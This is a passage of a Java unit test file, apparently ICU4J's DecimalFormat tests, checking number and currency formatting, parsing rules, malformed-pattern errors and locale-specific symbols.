\"%\\u00A0#,##0;%\\u00A0-#,##0\";\n        double num = -12.34;\n        DecimalFormatSymbols symbols = DecimalFormatSymbols.getInstance(loc);\n        // If the symbols ever change in locale data, please call the setters so that this test\n        // continues to use the old symbols.\n        // The fa percent symbol does change in CLDR 32, so....\n        symbols.setPercentString(\"‎٪\");\n        assertEquals(\"Checking for expected symbols\", \"‎−\", symbols.getMinusSignString());\n        assertEquals(\"Checking for expected symbols\", \"‎٪\", symbols.getPercentString());\n        DecimalFormat numfmt = new DecimalFormat(pattern1, symbols);\n        expect2(numfmt, num, \"‎٪ ‎−۱٬۲۳۴\");\n        String pattern2 = \"%#,##0;%-#,##0\";\n        numfmt = new DecimalFormat(pattern2, symbols);\n        expect2(numfmt, num, \"‎٪‎−۱٬۲۳۴\");\n    }\n\n    @Test\n    public void Test13113_MalformedPatterns() {\n        String[][] cases = {\n                {\"'\", \"quoted literal\"},\n                {\"ab#c'd\", \"quoted literal\"},\n                {\"ab#c*\", \"unquoted literal\"},\n                {\"0#\", \"# cannot follow 0\"},\n                {\".#0\", \"0 cannot follow #\"},\n                {\"@0\", \"Cannot mix @ and 0\"},\n                {\"0@\", \"Cannot mix 0 and @\"},\n                {\"#x#\", \"unquoted special character\"},\n                {\"@#@\", \"# inside of a run of @\"},\n        };\n        for (String[] cas : cases) {\n            try {\n                new DecimalFormat(cas[0]);\n                fail(\"Should have thrown on malformed pattern\");\n            } catch (IllegalArgumentException ex) {\n                assertTrue(\"Exception should contain \\\"Malformed pattern\\\": \" + ex.getMessage(),\n                        ex.getMessage().contains(\"Malformed pattern\"));\n                assertTrue(\"Exception should contain \\\"\" + cas[1] + \"\\\"\" + ex.getMessage(),\n                        ex.getMessage().contains(cas[1]));\n            }\n        }\n    }\n\n    @Test\n    public void Test13118() {\n        DecimalFormat df = new DecimalFormat(\"@@@\");\n        df.setScientificNotation(true);\n        for (double d=12345.67; d>1e-6; d/=10) {\n            String result = df.format(d);\n            assertEquals(\"Should produce a string of expected length on \" + d,\n                    d > 1 ? 6 : 7, result.length());\n        }\n    }\n\n    @Test\n    public void Test13289() {\n        DecimalFormat df = new DecimalFormat(\"#00.0#E0\");\n        String result = df.format(0.00123);\n        assertEquals(\"Should ignore scientific minInt if maxInt>minInt\", \"1.23E-3\", result);\n    }\n\n    @Test\n    public void Test13310() {\n        // Note: if minInt > 8, then maxInt can be greater than 8.\n        assertEquals(\"Should not throw an assertion error\",\n                \"100000007.6E-1\",\n                new DecimalFormat(\"000000000.0#E0\").format(10000000.76d));\n    }\n\n    @Test\n    public void Test13391() throws ParseException {\n        DecimalFormat df = (DecimalFormat) NumberFormat.getInstance(new ULocale(\"ccp\"));\n        df.setParseStrict(true);\n        String expected = \"\\uD804\\uDD37\\uD804\\uDD38,\\uD804\\uDD39\\uD804\\uDD3A\\uD804\\uDD3B\";\n        assertEquals(\"Should produce expected output in ccp\", expected, df.format(12345));\n        Number result = df.parse(expected);\n        assertEquals(\"Should parse to 12345 in ccp\", 12345, result.longValue());\n\n        df = (DecimalFormat) NumberFormat.getScientificInstance(new ULocale(\"ccp\"));\n        df.setParseStrict(true);\n        String expectedScientific = \"\\uD804\\uDD37.\\uD804\\uDD39E\\uD804\\uDD38\";\n        assertEquals(\"Should produce expected scientific output in ccp\",\n                expectedScientific, df.format(130));\n        Number resultScientific = df.parse(expectedScientific);\n        assertEquals(\"Should parse scientific to 130 in ccp\",\n                130, resultScientific.longValue());\n    }\n\n    @Test\n    public void Test13453_AffixContent() {\n        DecimalFormat df = (DecimalFormat) DecimalFormat.getScientificInstance();\n        assertEquals(\"Scientific should NOT be included\", \"\", df.getPositiveSuffix());\n\n        df = CompactDecimalFormat.getInstance(ULocale.ENGLISH, CompactDecimalFormat.CompactStyle.SHORT);\n        assertEquals(\"Compact should NOT be included\", \"\", df.getPositiveSuffix());\n\n        df = (DecimalFormat) DecimalFormat.getInstance(NumberFormat.ISOCURRENCYSTYLE);\n        df.setCurrency(Currency.getInstance(\"GBP\"));\n        assertEquals(\"ISO currency SHOULD be included\", \"GBP\", df.getPositivePrefix());\n\n        df = (DecimalFormat) DecimalFormat.getInstance(NumberFormat.PLURALCURRENCYSTYLE);\n        df.setCurrency(Currency.getInstance(\"GBP\"));\n        assertEquals(\"Plural name SHOULD be included\", \" British pounds\", df.getPositiveSuffix());\n    }\n\n    @Test\n    public void Test11035_FormatCurrencyAmount() {\n        double amount = 12345.67;\n        String expected = \"12,345$67 ​\";\n        Currency cur = Currency.getInstance(\"PTE\");\n\n        // Test three ways to set currency via API\n\n        ULocale loc1 = new ULocale(\"pt_PT\");\n        NumberFormat fmt1 = NumberFormat.getCurrencyInstance(loc1);\n        fmt1.setCurrency(cur);\n        String actualSetCurrency = fmt1.format(amount);\n\n        ULocale loc2 = new ULocale(\"pt_PT@currency=PTE\");\n        NumberFormat fmt2 = NumberFormat.getCurrencyInstance(loc2);\n        String actualLocaleString = fmt2.format(amount);\n\n        ULocale loc3 = new ULocale(\"pt_PT\");\n        NumberFormat fmt3 = NumberFormat.getCurrencyInstance(loc3);\n        CurrencyAmount curAmt = new CurrencyAmount(amount, cur);\n        String actualCurrencyAmount = fmt3.format(curAmt);\n\n        assertEquals(\"Custom Currency Pattern, Set Currency\", expected, actualSetCurrency);\n        assertEquals(\"Custom Currency Pattern, Locale String\", expected, actualCurrencyAmount);\n        assertEquals(\"Custom Currency Pattern, CurrencyAmount\", expected, actualLocaleString);\n    }\n\n    @Test\n    public void testPercentZero() {\n        DecimalFormat df = (DecimalFormat) NumberFormat.getPercentInstance();\n        String actual = df.format(0);\n        assertEquals(\"Should have one zero digit\", \"0%\", actual);\n    }\n\n    @Test\n    public void testCurrencyZeroRounding() {\n        DecimalFormat df = (DecimalFormat) NumberFormat.getCurrencyInstance();\n        df.setMaximumFractionDigits(0);\n        String actual = df.format(0);\n        assertEquals(\"Should have zero fraction digits\", \"$0\", actual);\n    }\n\n    @Test\n    public void testCustomCurrencySymbol() {\n        DecimalFormat df = (DecimalFormat) NumberFormat.getCurrencyInstance();\n        df.setCurrency(Currency.getInstance(\"USD\"));\n        DecimalFormatSymbols symbols = df.getDecimalFormatSymbols();\n        symbols.setCurrencySymbol(\"#\");\n        df.setDecimalFormatSymbols(symbols);\n        String actual = df.format(123);\n        assertEquals(\"Should use '#' instad of '$'\", \"# 123.00\", actual);\n    }\n\n    @Test\n    public void TestBasicSerializationRoundTrip() throws IOException, ClassNotFoundException {\n        DecimalFormat df0 = new DecimalFormat(\"A-**#####,#00.00b¤\");\n\n        // Write to byte stream\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(baos);\n        oos.writeObject(df0);\n        oos.flush();\n        baos.close();\n        byte[] bytes = baos.toByteArray();\n\n        // Read from byte stream\n        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));\n        Object obj = ois.readObject();\n        ois.close();\n        DecimalFormat df1 = (DecimalFormat) obj;\n\n        // Test equality\n        assertEquals(\"Did not round-trip through serialization\", df0, df1);\n\n        // Test basic functionality\n        String str0 = df0.format(12345.67);\n        String str1 = df1.format(12345.67);\n        assertEquals(\"Serialized formatter does not produce same output\", str0, str1);\n    }\n\n    @Test\n    public void testGetSetCurrency() {\n        DecimalFormat df = new DecimalFormat(\"¤#\", DecimalFormatSymbols.getInstance(ULocale.US));\n        assertEquals(\"Currency should start out as the locale default\", Currency.getInstance(\"USD\"), df.getCurrency());\n        Currency curr = Currency.getInstance(\"EUR\");\n        df.setCurrency(curr);\n        assertEquals(\"Currency should equal EUR after set\", curr, df.getCurrency());\n        String result = df.format(123);\n        assertEquals(\"Currency should format as expected in EUR\", \"€123.00\", result);\n    }\n\n    @Test\n    public void testRoundingModeSetters() {\n        DecimalFormat df1 = new DecimalFormat();\n        DecimalFormat df2 = new DecimalFormat();\n\n        df1.setRoundingMode(java.math.BigDecimal.ROUND_CEILING);\n        assertNotEquals(\"Rounding mode was set to a non-default\", df1, df2);\n        df2.setRoundingMode(com.ibm.icu.math.BigDecimal.ROUND_CEILING);\n        assertEquals(\"Rounding mode from icu.math and java.math should be the same\", df1, df2);\n        df2.setRoundingMode(java.math.RoundingMode.CEILING.ordinal());\n        assertEquals(\"Rounding mode ordinal from java.math.RoundingMode should be the same\", df1, df2);\n    }\n\n    @Test\n    public void testCurrencySignificantDigits() {\n        ULocale locale = new ULocale(\"en-US\");\n        DecimalFormat df = (DecimalFormat) NumberFormat.getCurrencyInstance(locale);\n        df.setMaximumSignificantDigits(2);\n        String result = df.format(1234);\n        assertEquals(\"Currency rounding should obey significant digits\", \"$1,200\", result);\n    }\n\n    @Test\n    public void testParseStrictScientific() {\n        // See ticket #13057\n        DecimalFormat df = (DecimalFormat) NumberFormat.getScientificInstance();\n        df.setParseStrict(true);\n        ParsePosition ppos = new ParsePosition(0);\n        Number result0 = df.parse(\"123E4\", ppos);\n        assertEquals(\"Should accept number with exponent\", 1230000L, result0);\n        assertEquals(\"Should consume the whole number\", 5, ppos.getIndex());\n        ppos.setIndex(0);\n        result0 = df.parse(\"123\", ppos);\n        // #13737: For backwards compatibility, do NOT require the exponent.\n        assertEquals(\"Should NOT reject number without exponent\", 123L, result0);\n        ppos.setIndex(0);\n        CurrencyAmount result1 = df.parseCurrency(\"USD123\", ppos);\n        assertEquals(\"Should NOT reject currency without exponent\",\n                new CurrencyAmount(123L, Currency.getInstance(\"USD\")),\n                result1);\n    }\n\n    @Test\n    public void testParseLenientScientific() {\n        DecimalFormat df = (DecimalFormat) NumberFormat.getScientificInstance();\n        ParsePosition ppos = new ParsePosition(0);\n        Number result0 = df.parse(\"123E\", ppos);\n        assertEquals(\"Should parse the number in lenient mode\", 123L, result0);\n        assertEquals(\"Should stop before the E\", 3, ppos.getIndex());\n        DecimalFormatSymbols dfs = df.getDecimalFormatSymbols();\n        dfs.setExponentSeparator(\"EE\");\n        df.setDecimalFormatSymbols(dfs);\n        ppos.setIndex(0);\n        result0 = df.parse(\"123EE\", ppos);\n        assertEquals(\"Should parse the number in lenient mode\", 123L, result0);\n        assertEquals(\"Should stop before the EE\", 3, ppos.getIndex());\n    }\n\n    @Test\n    public void testParseAcceptAsciiPercentPermilleFallback() {\n        ULocale loc = new ULocale(\"ar\");\n        DecimalFormat df = (DecimalFormat) NumberFormat.getPercentInstance(loc);\n        ParsePosition ppos = new ParsePosition(0);\n        Number result = df.parse(\"42%\", ppos);\n        assertEquals(\"Should parse as 0.42 even in ar\", new BigDecimal(\"0.42\"), result);\n        assertEquals(\"Should consume the entire string even in ar\", 3, ppos.getIndex());\n        // TODO: Is there a better way to make a localized permille formatter?\n        df.applyPattern(df.toPattern().replace(\"%\", \"‰\"));\n        ppos.setIndex(0);\n        result = df.parse(\"42‰\", ppos);\n        assertEquals(\"Should parse as 0.042 even in ar\", new BigDecimal(\"0.042\"), result);\n        assertEquals(\"Should consume the entire string even in ar\", 3, ppos.getIndex());\n    }\n\n    @Test\n    public void testParseSubtraction() {\n        // TODO: Is this a case we need to support? It prevents us from automatically parsing\n        // minus signs that appear after the number, like  in \"12-\" vs \"-12\".\n        DecimalFormat df = new DecimalFormat();\n        String str = \"12 - 5\";\n        ParsePosition ppos = new ParsePosition(0);\n        Number n1 = df.parse(str, ppos);\n        Number n2 = df.parse(str, ppos);\n        assertEquals(\"Should parse 12 and -5\", 12, n1.intValue());\n        assertEquals(\"Should parse 12 and -5\", -5, n2.intValue());\n    }\n\n    @Test\n    public void testSetPrefixDefaultSuffix() {\n        DecimalFormat df = (DecimalFormat) NumberFormat.getPercentInstance();\n        df.setPositivePrefix(\"+\");\n        assertEquals(\"Should have manual plus sign and auto percent sign\", \"+100%\", df.format(1));\n    }\n\n    @Test\n    public void testMultiCodePointPaddingInPattern() {\n        DecimalFormat df = new DecimalFormat(\"a*'நி'###0b\");\n        String result = df.format(12);\n        assertEquals(\"Multi-codepoint padding should not be split\", \"aநிநி12b\", result);\n        df = new DecimalFormat(\"a*😁###0b\");\n        result = df.format(12);\n        assertEquals(\"Single-codepoint padding should not be split\", \"a😁😁12b\", result);\n        df = new DecimalFormat(\"a*''###0b\");\n        result = df.format(12);\n        assertEquals(\"Quote should be escapable in padding syntax\", \"a''12b\", result);\n    }\n\n    @Test\n    public void Test13737_ParseScientificStrict() {\n        NumberFormat df = NumberFormat.getScientificInstance(ULocale.ENGLISH);\n        df.setParseStrict(true);\n        // Parse Test: exponent is not required, even in strict mode\n        expect(df, \"1.2\", 1.2);\n    }\n\n    // TODO: Investigate this test and re-enable if appropriate.\n    @Test\n    @Ignore\n    public void testParseAmbiguousAffixes() {\n        BigDecimal positive = new BigDecimal(\"0.0567\");\n        BigDecimal negative = new BigDecimal(\"-0.0567\");\n        DecimalFormat df = new DecimalFormat();\n        df.setParseBigDecimal(true);\n\n        String[] patterns = { \"+0.00%;-0.00%\", \"+0.00%;0.00%\", \"0.00%;-0.00%\" };\n        String[] inputs = { \"+5.67%\", \"-5.67%\", \"5.67%\" };\n        boolean[][] expectedPositive = {\n                { true, false, true },\n                { true, false, false },\n                { true, false, true }\n        };\n\n        for (int i=0; i<patterns.length; i++) {\n            String pattern = patterns[i];\n            df.applyPattern(pattern);\n            for (int j=0; j<inputs.length; j++) {\n                String input = inputs[j];\n                ParsePosition ppos = new ParsePosition(0);\n                Number actual = df.parse(input, ppos);\n                BigDecimal expected = expectedPositive[i][j] ? positive : negative;\n                String message = \"Pattern \" + pattern + \" with input \" + input;\n                assertEquals(message, expected, actual);\n                assertEquals(message, input.length(), ppos.getIndex());\n            }\n        }\n    }\n\n    @Test\n    public void testParseIgnorables() {\n        // Also see the test case \"test parse ignorables\" in numberformattestspecification.txt\n        DecimalFormatSymbols dfs = DecimalFormatSymbols.getInstance();\n        dfs.setPercentString(\"\\u200E%\\u200E\");\n        DecimalFormat df = new DecimalFormat(\"0 %;-0a\", dfs);\n        ParsePosition ppos = new ParsePosition(0);\n        Number result = df.parse(\"42\\u200E%\\u200E \", ppos);\n        assertEquals(\"Should parse as percentage\", new BigDecimal(\"0.42\"), result);\n        assertEquals(\"Should consume the trailing bidi since it is in the symbol\", 5, ppos.getIndex());\n        ppos.setIndex(0);\n        result = df.parse(\"-42a\\u200E \", ppos);\n        assertEquals(\"Should parse as percent\", -0.42, result.doubleValue());\n        assertEquals(\"Should not consume the trailing bidi or whitespace\", 4, ppos.getIndex());\n\n        // A few more cases based on the docstring:\n        expect(df, \"42%\", 0.42);\n        expect(df, \"42 %\", 0.42);\n        expect(df, \"42   %\", 0.42);\n        expect(df, \"42\\u00A0%\", 0.42);\n    }\n\n    @Test\n    public void testCustomCurrencyUsageOverridesPattern() {\n        DecimalFormat df = new DecimalFormat(\"#,##0.###\");\n        expect2(df, 1234, \"1,234\");\n        df.setCurrencyUsage(CurrencyUsage.STANDARD);\n        expect2(df, 1234, \"1,234.00\");\n        df.setCurrencyUsage(null);\n        expect2(df, 1234, \"1,234\");\n    }\n\n    @Test\n    public void testCurrencyUsageFractionOverrides() {\n        NumberFormat df = DecimalFormat.getCurrencyInstance(ULocale.US);\n        expect2(df, 35.0, \"$35.00\");\n        df.setMinimumFractionDigits(3);\n        expect2(df, 35.0, \"$35.000\");\n        df.setMaximumFractionDigits(3);\n        expect2(df, 35.0, \"$35.000\");\n        df.setMinimumFractionDigits(-1);\n        expect2(df, 35.0, \"$35.00\");\n        df.setMaximumFractionDigits(-1);\n        expect2(df, 35.0, \"$35.00\");\n    }\n\n    @Test\n    public void testParseVeryVeryLargeExponent() {\n        DecimalFormat df = new DecimalFormat();\n        ParsePosition ppos = new ParsePosition(0);\n\n        Object[][] cases = {\n                {\"1.2E+1234567890\", Double.POSITIVE_INFINITY},\n                {\"1.2E+999999999\", new com.ibm.icu.math.BigDecimal(\"1.2E+999999999\")},\n                {\"1.2E+1000000000\", Double.POSITIVE_INFINITY},\n                {\"-1.2E+999999999\", new com.ibm.icu.math.BigDecimal(\"-1.2E+999999999\")},\n                {\"-1.2E+1000000000\", Double.NEGATIVE_INFINITY},\n                {\"1.2E-999999999\", new com.ibm.icu.math.BigDecimal(\"1.2E-999999999\")},\n                {\"1.2E-1000000000\", 0.0},\n                {\"-1.2E-999999999\", new com.ibm.icu.math.BigDecimal(\"-1.2E-999999999\")},\n                {\"-1.2E-1000000000\", -0.0},\n\n        };\n\n        for (Object[] cas : cases) {\n            ppos.setIndex(0);\n            String input = (String) cas[0];\n            Number expected = (Number) cas[1];\n            Number actual = df.parse(input, ppos);\n            assertEquals(input, expected, actual);\n        }\n    }\n\n    @Test\n    public void testStringMethodsNPE() {\n        String[] npeMethods = {\n                \"applyLocalizedPattern\",\n                \"applyPattern\",\n                \"setNegativePrefix\",\n                \"setNegativeSuffix\",\n                \"setPositivePrefix\",\n                \"setPositiveSuffix\"\n        };\n        for (String npeMethod : npeMethods) {\n            DecimalFormat df = new DecimalFormat();\n            try {\n                DecimalFormat.class.getDeclaredMethod(npeMethod, String.class).invoke(df, (String) null);\n                fail(\"NullPointerException not thrown in method \" + npeMethod);\n            } catch (InvocationTargetException e) {\n                assertTrue(\"Exception should be NullPointerException in method \" + npeMethod,\n                        e.getCause() instanceof NullPointerException);\n            } catch (Exception e) {\n                // Other reflection exceptions\n                throw new AssertionError(\"Reflection error in method \" + npeMethod + \": \" + e.getMessage());\n            }\n        }\n\n        // Also test the constructors\n        try {\n            new DecimalFormat(null);\n            fail(\"NullPointerException not thrown in 1-parameter constructor\");\n        } catch (NullPointerException e) {\n            // Expected\n        }\n        try {\n            new DecimalFormat(null, new DecimalFormatSymbols());\n            fail(\"NullPointerException not thrown in 2-parameter constructor\");\n        } catch (NullPointerException e) {\n            // Expected\n        }\n        try {\n            new DecimalFormat(null, new DecimalFormatSymbols(), CurrencyPluralInfo.getInstance(), 0);\n            fail(\"NullPointerException not thrown in 4-parameter constructor\");\n        } catch (NullPointerException e) {\n            // Expected\n        }\n    }\n\n    @Test\n    public void testParseNoExponent() throws ParseException {\n        DecimalFormat df = new DecimalFormat();\n        assertEquals(\"Parse no exponent has wrong default\", false, df.getParseNoExponent());\n        Number result1 = df.parse(\"123E4\");\n        df.setParseNoExponent(true);\n        assertEquals(\"Parse no exponent getter is broken\", true, df.getParseNoExponent());\n        Number result2 = df.parse(\"123E4\");\n        assertEquals(\"Exponent did not parse before setParseNoExponent\", result1, new Long(1230000));\n        assertEquals(\"Exponent parsed after setParseNoExponent\", result2, new Long(123));\n    }\n\n    @Test\n    public void testMinimumGroupingDigits() {\n        String[][] allExpected = {\n                {\"123\", \"123\"},\n                {\"1,230\", \"1230\"},\n                {\"12,300\", \"12,300\"},\n                {\"1,23,000\", \"1,23,000\"}\n        };\n\n        DecimalFormat df = new DecimalFormat(\"#,##,##0\");\n        assertEquals(\"Minimum grouping digits has wrong default\", 1, df.getMinimumGroupingDigits());\n\n        for (int l = 123, i=0; l <= 123000; l *= 10, i++) {\n            df.setMinimumGroupingDigits(1);\n            assertEquals(\"Minimum grouping digits getter is broken\", 1, df.getMinimumGroupingDigits());\n            String actual = df.format(l);\n            assertEquals(\"Output is wrong for 1, \"+i, allExpected[i][0], actual);\n            df.setMinimumGroupingDigits(2);\n            assertEquals(\"Minimum grouping digits getter is broken\", 2, df.getMinimumGroupingDigits());\n            actual = df.format(l);\n            assertEquals(\"Output is wrong for 2, \"+i, allExpected[i][1], actual);\n        }\n    }\n\n    @Test\n    public void testParseCaseSensitive() {\n        String[] patterns = {\"a#b\", \"A#B\"};\n        String[] inputs = {\"a500b\", \"A500b\", \"a500B\", \"a500e10b\", \"a500E10b\"};\n        int[][] expectedParsePositions = {\n                {5, 5, 5, 8, 8}, // case insensitive, pattern 0\n                {5, 0, 4, 4, 8}, // case sensitive, pattern 0\n                {5, 5, 5, 8, 8}, // case insensitive, pattern 1\n                {0, 4, 0, 0, 0}, // case sensitive, pattern 1\n        };\n\n        for (int p = 0; p < patterns.length; p++) {\n            String pat = patterns[p];\n            DecimalFormat df = new DecimalFormat(pat);\n            assertEquals(\"parseCaseSensitive default is wrong\", false, df.getParseCaseSensitive());\n            for (int i = 0; i < inputs.length; i++) {\n                String inp = inputs[i];\n                df.setParseCaseSensitive(false);\n                assertEquals(\"parseCaseSensitive getter is broken\", false, df.getParseCaseSensitive());\n                ParsePosition actualInsensitive = new ParsePosition(0);\n                df.parse(inp, actualInsensitive);\n                assertEquals(\"Insensitive, pattern \"+p+\", input \"+i,\n                        expectedParsePositions[p*2][i], actualInsensitive.getIndex());\n                df.setParseCaseSensitive(true);\n                assertEquals(\"parseCaseSensitive getter is broken\", true, df.getParseCaseSensitive());\n                ParsePosition actualSensitive = new ParsePosition(0);\n                df.parse(inp, actualSensitive);\n                assertEquals(\"Sensitive, pattern \"+p+\", input \"+i,\n                        expectedParsePositions[p*2+1][i], actualSensitive.getIndex());\n            }\n        }\n    }\n\n    @Test\n    public void testPlusSignAlwaysShown() throws ParseException {\n        double[] numbers = {0.012, 5.78, 0, -0.012, -5.78};\n        ULocale[] locs = {new ULocale(\"en-US\"), new ULocale(\"ar-EG\"), new ULocale(\"es-CL\")};\n        String[][][] expecteds = {\n                // en-US\n                {\n                    // decimal\n                    { \"+0.012\", \"+5.78\", \"+0\", \"-0.012\", \"-5.78\" },\n                    // currency\n                    { \"+$0.01\", \"+$5.78\", \"+$0.00\", \"-$0.01\", \"-$5.78\" }\n                },\n                // ar-EG (interesting because the plus sign string starts with \\u061C)\n                {\n                    // decimal\n                    {\n                        \"\\u061C+\\u0660\\u066B\\u0660\\u0661\\u0662\", // \"؜+٠٫٠١٢\"\n                        \"\\u061C+\\u0665\\u066B\\u0667\\u0668\", // \"؜+٥٫٧٨\"\n                        \"\\u061C+\\u0660\", // \"؜+٠\"\n                        \"\\u061C-\\u0660\\u066B\\u0660\\u0661\\u0662\", // \"؜-٠٫٠١٢\"\n                        \"\\u061C-\\u0665\\u066B\\u0667\\u0668\", // \"؜-٥٫٧٨\"\n                    },\n                    // currency (\\062C.\\0645.\\200F is the currency sign in ar for EGP)\n                    {\n                        \"\\u061C+\\u0660\\u066B\\u0660\\u0661\\u00A0\\u062C.\\u0645.\\u200F\",\n                        \"\\u061C+\\u0665\\u066B\\u0667\\u0668\\u00A0\\u062C.\\u0645.\\u200F\",\n                        \"\\u061C+\\u0660\\u066B\\u0660\\u0660\\u00A0\\u062C.\\u0645.\\u200F\",\n                        \"\\u061C-\\u0660\\u066B\\u0660\\u0661\\u00A0\\u062C.\\u0645.\\u200F\",\n                        \"\\u061C-\\u0665\\u066B\\u0667\\u0668\\u00A0\\u062C.\\u0645.\\u200F\"\n                    }\n                },\n                // es-CL (interesting because of position of sign in currency)\n                {\n                    // decimal\n                    { \"+0,012\", \"+5,78\", \"+0\", \"-0,012\", \"-5,78\" },\n                    // currency (note: rounding for es-CL's currency, CLP, is 0 fraction digits)\n                    { \"$+0\", \"$+6\", \"$+0\", \"$-0\", \"$-6\" }\n                }\n        };\n\n        for (int i=0; i<locs.length; i++) {\n            ULocale loc = locs[i];\n            DecimalFormat df1 = (DecimalFormat) NumberFormat.getNumberInstance(loc);\n            assertFalse(\"Default should be false\", df1.getSignAlwaysShown());\n            df1.setSignAlwaysShown(true);\n            assertTrue(\"Getter should now return true\", df1.getSignAlwaysShown());\n            DecimalFormat df2 = (DecimalFormat) NumberFormat.getCurrencyInstance(loc);\n            assertFalse(\"Default should be false\", df2.getSignAlwaysShown());\n            df2.setSignAlwaysShown(true);\n            assertTrue(\"Getter should now return true\", df2.getSignAlwaysShown());\n            for (int j=0; j<2; j++) {\n                DecimalFormat df = (j == 0) ? df1 : df2;\n                for (int k=0; k<numbers.length; k++) {\n                    double d = numbers[k];\n                    String exp = expecteds[i][j][k];\n                    String act = df.format(d);\n                    assertEquals(\"Locale \" + loc + \", type \" + j + \", \" + d, exp, act);\n                    BigDecimal parsedExp = BigDecimal.valueOf(d);\n                    if (j == 1) {\n                        // Currency-round expected parse output\n                        int scale = (i == 2) ? 0 : 2;\n                        parsedExp = parsedExp.setScale(scale, BigDecimal.ROUND_HALF_EVEN);\n                    }\n                    Number parsedNum = df.parse(exp);\n                    BigDecimal parsedAct = (parsedNum.getClass() == BigDecimal.class)\n                            ? (BigDecimal) parsedNum\n                            : BigDecimal.valueOf(parsedNum.doubleValue());\n                    assertEquals(\n                            \"Locale \" + loc + \", type \" + j + \", \" + d + \", \" + parsedExp + \" => \" + parsedAct,\n                            0, parsedExp.compareTo(parsedAct));\n                }\n            }\n        }\n    }\n\n    @Test\n    public void Test20073_StrictPercentParseErrorIndex() {\n        ParsePosition parsePosition = new ParsePosition(0);\n        DecimalFormat df = new DecimalFormat(\"0%\", DecimalFormatSymbols.getInstance(Locale.US));\n        df.setParseStrict(true);\n        Number number = df.parse(\"%2%\", parsePosition);\n        assertNull(\"\", number);\n        assertEquals(\"\", 0, parsePosition.getIndex());\n        assertEquals(\"\", 0, parsePosition.getErrorIndex());\n    }\n\n    @Test\n    public void Test11626_CustomizeCurrencyPluralInfo() throws ParseException {\n        // Use locale sr because it has interesting plural rules.\n        ULocale locale = ULocale.forLanguageTag(\"sr\");\n        DecimalFormatSymbols symbols = DecimalFormatSymbols.getInstance(locale);\n        CurrencyPluralInfo info = CurrencyPluralInfo.getInstance(locale);\n        info.setCurrencyPluralPattern(\"one\", \"0 qwerty\");\n        info.setCurrencyPluralPattern(\"few\", \"0 dvorak\");\n        DecimalFormat df = new DecimalFormat(\"#\", symbols, info, NumberFormat.CURRENCYSTYLE);\n        df.setCurrency(Currency.getInstance(\"USD\"));\n        df.setMaximumFractionDigits(0);\n\n        assertEquals(\"Plural one\", \"1 qwerty\", df.format(1));\n        assertEquals(\"Plural few\", \"3 dvorak\", df.format(3));\n        assertEquals(\"Plural other\", \"99 америчких долара\", df.format(99));\n\n        info.setPluralRules(\"few: n is 1; one: n in 2..4\");\n        df.setCurrencyPluralInfo(info);\n        assertEquals(\"Plural one\", \"1 dvorak\", df.format(1));\n        assertEquals(\"Plural few\", \"3 qwerty\", df.format(3));\n        assertEquals(\"Plural other\", \"99 америчких долара\", df.format(99));\n    }\n\n    @Test\n    public void TestNarrowCurrencySymbols() {\n        DecimalFormat df = (DecimalFormat) NumberFormat.getCurrencyInstance(ULocale.CANADA);\n        df.setCurrency(Currency.getInstance(\"USD\"));\n        expect2(df, 123.45, \"US$123.45\");\n        String pattern = df.toPattern();\n        pattern = pattern.replace(\"¤\", \"¤¤¤¤¤\");\n        df.applyPattern(pattern);\n        // Note: Narrow currency is not parseable because of ambiguity.\n        assertEquals(\"Narrow currency symbol for USD in en_CA is $\",\n                \"$123.45\", df.format(123.45));\n    }\n\n    @Test\n    public void TestAffixOverrideBehavior() {\n        DecimalFormat df = (DecimalFormat) NumberFormat.getInstance(ULocale.ENGLISH);\n        expect2(df, 100, \"100\");\n        expect2(df, -100, \"-100\");\n        // This is not the right way to set an override plus sign, but we need to support it for compatibility.\n        df.setPositivePrefix(\"+\");\n        expect2(df, 100, \"+100\");\n        expect2(df, -100, \"-100\"); // note: the positive prefix does not affect the negative prefix\n        df.applyPattern(\"a0\");\n        expect2(df, 100, \"a100\");\n        expect2(df, -100, \"-a100\");\n    }\n\n    @Test\n    public void TestCurrencyRoundingMinWithoutMax() {\n        NumberFormat currencyFormat = DecimalFormat.getCurrencyInstance(Locale.US);\n        currencyFormat.setCurrency(Currency.getInstance(\"AUD\"));\n        currencyFormat.setMinimumFractionDigits(0);\n        expect(currencyFormat, 0.001, \"A$0\");\n\n        // NOTE: The size of the increment takes precedent over minFrac since ICU 59.\n        // CAD-Cash uses nickel rounding.\n        currencyFormat = DecimalFormat.getCurrencyInstance(Locale.US);\n        currencyFormat.setCurrency(Currency.getInstance(\"CAD\"));\n        ((DecimalFormat)currencyFormat).setCurrencyUsage(CurrencyUsage.CASH);\n        currencyFormat.setMinimumFractionDigits(0);\n        // expect(currencyFormat, 0.08, \"CA$0.1\");  // ICU 58 and down\n        expect(currencyFormat, 0.08, \"CA$0.10\");  // ICU 59 and up\n    }\n\n    @Test\n    public void testParsePositionIncrease() {\n        String input = \"123\\n456\\n$789\";\n        ParsePosition ppos = new ParsePosition(0);\n        DecimalFormat df = new DecimalFormat();\n        df.parse(input, ppos);\n        assertEquals(\"Should stop after first entry\", 3, ppos.getIndex());\n        ppos.setIndex(ppos.getIndex() + 1);\n        df.parse(input, ppos);\n        assertEquals(\"Should stop after second entry\", 7, ppos.getIndex());\n        ppos.setIndex(ppos.getIndex() + 1);\n        df.parseCurrency(input, ppos); // test parseCurrency API as well\n        assertEquals(\"Should stop after third entry\", 12, ppos.getIndex());\n    }\n\n    @Test\n    public void testTrailingMinusSign() {\n        String input = \"52-\";\n        DecimalFormat df = (DecimalFormat) DecimalFormat.getInstance(ULocale.ENGLISH);\n        ParsePosition ppos = new ParsePosition(0);\n        Number result = df.parse(input, ppos);\n        assertEquals(\"Trailing sign should NOT be accepted after the number in English by default\",\n                52.0,\n                result.doubleValue(),\n                0.0);\n        df.applyPattern(\"#;#-\");\n        ppos.setIndex(0);\n        result = df.parse(input, ppos);\n        assertEquals(\"Trailing sign SHOULD be accepted if there is one in the pattern\",\n                -52.0,\n                result.doubleValue(),\n                0.0);\n    }\n\n    @Test\n    public void testScientificCustomSign() {\n        DecimalFormatSymbols dfs = DecimalFormatSymbols.getInstance(ULocale.ENGLISH);\n        dfs.setMinusSignString(\"nnn\");\n        dfs.setPlusSignString(\"ppp\");\n        DecimalFormat df = new DecimalFormat(\"0E0\", dfs);\n        df.setExponentSignAlwaysShown(true);\n        expect2(df, 0.5, \"5Ennn1\");\n        expect2(df, 50, \"5Eppp1\");\n    }\n\n    @Test\n    public void testParsePercentInPattern() {\n        DecimalFormatSymbols dfs = 